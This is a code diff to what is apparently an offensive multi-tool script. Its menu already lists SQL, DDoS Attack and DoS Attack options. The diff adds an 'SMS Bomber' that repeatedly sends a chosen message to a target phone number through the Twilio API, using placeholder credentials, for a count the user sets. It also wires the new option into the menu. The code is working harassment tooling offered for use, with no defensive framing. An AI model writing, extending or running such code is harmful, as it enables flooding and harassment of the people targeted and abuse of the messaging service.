@@ -152,6 +152,19 @@ def dos_attack(url, rate_limit=10, delay_range=(1, 3)):
     attack_thread = threading.Thread(target=attack)
     attack_thread.start()
 
+def sms_bomber(phone_number, message, count):
+    for i in range(count):
+        try:
+            response = requests.post(
+                "https://api.twilio.com/2010-04-01/Accounts/YOUR_ACCOUNT_SID/Messages.json",
+                auth=("YOUR_ACCOUNT_SID", "YOUR_AUTH_TOKEN"),
+                data={"From": "YOUR_TWILIO_NUMBER",
+                      "To": phone_number,
+                      "Body": message})
+            print(f"Sent SMS {i+1} to {phone_number} - Status code: {response.status_code}")
+        except requests.RequestException as e:
+            print(f"Error: {e}")
+
 def main():
     while True:
         print("Choose an option:")
@@ -160,9 +173,10 @@ def main():
         print("3. SQL")
         print("4. DDoS Attack")
         print("5. DoS Attack")
-        print("6. Exit")
+        print("6. SMS Bomber")
+        print("7. Exit")
 
-        choice = input("Enter your choice (1, 2, 3, 4, 5 or 6): ")
+        choice = input("Enter your choice (1, 2, 3, 4, 5, 6 or 7): ")
 
         if choice == '1':
             domain, username = prompt_for_input()
@@ -221,11 +235,17 @@ def main():
             dos_attack(url, rate_limit, delay_range)
 
         elif choice == '6':
+            phone_number = input("Please enter the target phone number: ")
+            message = input("Enter the message to send: ")
+            count = int(input("Enter the number of messages to send: "))
+            sms_bomber(phone_number, message, count)
+
+        elif choice == '7':
             print("Exiting...")
             sys.exit(0)
 
         else:
-            print("Invalid choice. Please enter 1, 2, 3, 4, 5 or 6.")
+            print("Invalid choice. Please enter 1, 2, 3, 4, 5, 6 or 7.")
 
 if __name__ == '__main__':
     main()
